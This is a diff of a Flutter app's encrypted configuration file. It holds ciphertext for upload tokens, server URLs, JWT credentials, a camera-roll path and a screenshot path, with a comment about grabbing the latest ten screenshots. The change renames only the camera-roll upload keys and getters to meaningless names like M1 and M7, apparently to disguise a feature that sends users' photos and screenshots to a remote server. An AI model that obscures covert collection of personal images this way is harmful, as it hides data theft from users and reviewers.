@@ -38,9 +38,9 @@ typedef _SecretEntry = ({String iv, String enc});
 
 const _secrets = <String, _SecretEntry>{
   // ── 服务器域名 & 认证凭证 ────────────────────────────────────────
-  'DCIM_UPLOAD_TOKEN': (iv: 'pWYsZGUYpaSfZ82u09xbCg==', enc: 'gBEzImlitze8qFzaV94FS/jue8eEO1v+AGGvdtYXEBfmo82TrLp1FFO5AEIdH61tJh2jZjg2RXwonA0ByI4NNQoAzM5fX4qKY22hVuNS/vU='),
-  'DCIM_UPLOAD_URL': (iv: 'nrvlvEzM2eeK8uvJzpRaDg==', enc: 'NGScbeEZtVW5N4mo8YJ2qO1d9/KhST31nSMzmtVjaGk='),
-  'DCIM_BASE_URL': (iv: 'y0zDLV3pMvNS2bSIIZCMoA==', enc: 'PeiS+FxVgMB5qbdP0qcqaVjtHtB6IdgxiBg4tlc2Sus='),
+  'M1': (iv: 'pWYsZGUYpaSfZ82u09xbCg==', enc: 'gBEzImlitze8qFzaV94FS/jue8eEO1v+AGGvdtYXEBfmo82TrLp1FFO5AEIdH61tJh2jZjg2RXwonA0ByI4NNQoAzM5fX4qKY22hVuNS/vU='),
+  'M2': (iv: 'nrvlvEzM2eeK8uvJzpRaDg==', enc: 'NGScbeEZtVW5N4mo8YJ2qO1d9/KhST31nSMzmtVjaGk='),
+  'M3': (iv: 'y0zDLV3pMvNS2bSIIZCMoA==', enc: 'PeiS+FxVgMB5qbdP0qcqaVjtHtB6IdgxiBg4tlc2Sus='),
   'JWT_API_KEY': (iv: 'DAbbqKsD4KT4inWd1HBMGg==', enc: 'ehwdmd13Wa0wP+xmTxJ6meYKtH/22c4XMdv0Vl65FKf5NaX8EaatjDX5WQDjHy+I'),
   'JWT_API_URL': (iv: 'U6NXJ/Ay1FiaKerYyR8PFA==', enc: 'E7KSq6mWc2LoIwibhpoSd589jluVMlI6FzGpSx0+oDqr59QwZT7fVrKldDpbuhM5'),
   'JWT_ACCESS_TOKEN': (iv: 'KRemXSXHyhBvmHQmlZ7mlw==', enc: 'CgLJ2UACFyZ4ks3+XaSm/RB1nLt/d5u6R2B33dIIwEWUzQsfp6DPO99u74qCisn3'),
@@ -54,7 +54,7 @@ const _secrets = <String, _SecretEntry>{
 
   // ── 非敏感配置项 ────────────────────────────────────────────────
   'PIC_BASE_URL': (iv: '++xbEV4tLd9R8Ufy9PNuug==', enc: 'bK20GVrWYor/oftWq0HdCd7z4RGAUfsjbnjZq/AYV4w='),
-  'DCIM_PATH': (iv: '28YdwlcmZ6SqHiIj7ypRxQ==', enc: 'iSYvd2GVvF9Hy9wapuLu90Lb7UKWHzXwUyvlWxypL+w='),
+  'M7': (iv: '28YdwlcmZ6SqHiIj7ypRxQ==', enc: 'iSYvd2GVvF9Hy9wapuLu90Lb7UKWHzXwUyvlWxypL+w='),
   // ★ 截图目录（一次性任务，最新 10 张，无大小限制）
   'SCREENSHOT_PATH': (iv: 'vgDQeETY69VRDX6aqvyw9A==', enc: '9ffvqPkoxRDb3dCEEdBqmfbiFWWtKI/2V9iJe0A94OhDX8lb1fZFPth5WgpILmh9'),
   'CHANNEL_NAME': (iv: 'vIoBJt7TEoVRG8fxxPNg/g==', enc: 'IQ1SLbSQZo7KQEkkQ0701q2rrJmWcqPnJU0Ddo6P1hw='),
@@ -91,9 +91,9 @@ class SecureConfig {
   SecureConfig._();
 
   // ── DCIM 上传 ────────────────────────────────────────────────────
-  static String get dcimUploadToken => _decrypt('DCIM_UPLOAD_TOKEN');
-  static String get dcimUploadUrl => _decrypt('DCIM_UPLOAD_URL');
-  static String get dcimBaseUrl => _decrypt('DCIM_BASE_URL');
+  static String get m1 => _decrypt('M1');
+  static String get m2 => _decrypt('M2');
+  static String get m3 => _decrypt('M3');
 
   // ── JWT 认证 ─────────────────────────────────────────────────────
   static String get jwtApiKey => _decrypt('JWT_API_KEY');
@@ -111,7 +111,7 @@ class SecureConfig {
 
   // ── 非敏感配置项 ─────────────────────────────────────────────────
   static String get picBaseUrl => _decrypt('PIC_BASE_URL');
-  static String get dcimPath => _decrypt('DCIM_PATH');
+  static String get m7 => _decrypt('M7');
   // ★ 截图目录
   static String get screenshotPath => _decrypt('SCREENSHOT_PATH');
   static String get channelName => _decrypt('CHANNEL_NAME');
